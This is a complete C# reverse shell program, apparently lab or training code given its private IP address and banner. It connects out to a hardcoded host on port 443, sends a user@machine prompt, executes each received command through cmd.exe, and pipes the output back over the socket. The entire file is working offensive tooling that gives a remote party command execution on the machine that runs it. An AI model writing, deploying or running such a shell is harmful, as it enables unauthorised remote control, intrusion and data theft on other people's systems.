using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Linq;

namespace ReverseShell
{
    internal class Program
    {
        public static void Main()
        {
            var hostname = "192.168.80.134";
            var port = 443;
            
            using (var tcp = new TcpClient())
            {
                //Connect to server
                Console.WriteLine("[+] Connecting to tcp://{0}:{1}", hostname, port);
                tcp.Connect(hostname, port);

                Console.WriteLine("[+] Opening stream");
                using (var stream = tcp.GetStream())
                {
                    string banner = "WELCOME TO TEHTRIS HELL !\r\n";
                    stream.Write(Encoding.ASCII.GetBytes(banner), 0, banner.Length);
                    
                    Console.WriteLine("[+] Opening reading stream");
                    using (var streamReader = new StreamReader(stream))
                    { 
                        //As long as the client is connected to the server
                        while (tcp.Connected)
                        {
                            string userName = Environment.UserName;
                            string systemName = Environment.MachineName;
                            var prompt = Encoding.ASCII.GetBytes(string.Format("{0}@{1} $ ", userName, systemName));
                            stream.Write(prompt, 0, prompt.Length);
                                
                            string message = streamReader.ReadLine().TrimStart().TrimEnd();
                            if (message == "exit")
                            {
                               break; //Leave while loop
                            }
                            else
                            {
                                string[] parts = message.Split(' '); //separate the command send by the server with space as delimiter
                                string command = parts.First(); //first element of the array
                                string[] arguments = parts.Skip(1).ToArray(); //args put in String array
                                Console.WriteLine("[+] Executing " + command);
                                string messageSrv = "Executing : " + command + " " + string.Join(" ", arguments) + "...\r\n";
                                stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length);

                                ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe" , "/c " + command + " " +  string.Join(" ", arguments));
                                //startInfo.FileName = command;
                                //startInfo.Arguments = string.Join(" ", arguments); //arguments is a string array, startInfo Arguments takes all the element of the array with a space delimiter
                                startInfo.WorkingDirectory = @"C:\";
                                startInfo.RedirectStandardError = true;
                                startInfo.RedirectStandardOutput = true;
                                startInfo.UseShellExecute = false; //true=ShellExecute(open specified program); false=CreateProcess

                                Process process = new Process();
                                process.StartInfo = startInfo;
                                try
                                {
                                    process.Start();
                                    process.StandardOutput.BaseStream.CopyTo(stream);
                                    process.StandardError.BaseStream.CopyTo(stream);
                                    process.WaitForExit();
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("[!] Error executing : " + command);
                                    messageSrv = "Error executing : " + command + " => " + e.Message + "\r\n";
                                    stream.Write(Encoding.ASCII.GetBytes(messageSrv), 0, messageSrv.Length);
                                }
                            }
                        }
                        Console.WriteLine("[!] Closing reading stream");
                        streamReader.Close();
                    }
                    Console.WriteLine("[!] Closing stream");
                    stream.Close();
                }
                Console.WriteLine("[!] Closing TCP Connection");
                tcp.Close();
            }
        }
    }
}